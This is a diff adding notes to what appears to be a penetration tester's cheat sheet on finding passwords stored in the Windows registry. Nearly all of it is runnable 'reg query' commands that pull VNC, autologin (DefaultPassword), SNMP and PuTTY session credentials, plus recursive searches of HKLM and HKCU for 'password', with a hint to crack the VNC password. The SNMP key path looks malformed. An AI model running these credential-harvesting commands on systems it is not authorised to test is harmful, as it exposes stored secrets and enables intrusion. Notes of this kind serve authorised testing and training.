@@ -1,3 +1,26 @@
+Registry
+Sometimes developers and admins store passwords of services in the registry. 
+
+# VNC
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+    --> crack password with vncpwd.exe
+
+# Windows autologin
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername 
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+
+# SNMP Parameters
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+
+# Putty
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+    #NOTE: if you get redirected, use that redirect 
+    reg query "HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42"
+
+# Search for password in registry
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+
 Search the registry for key names and passwords
 REG QUERY HKLM /F "password" /t REG_SZ /S /K
 REG QUERY HKCU /F "password" /t REG_SZ /S /K
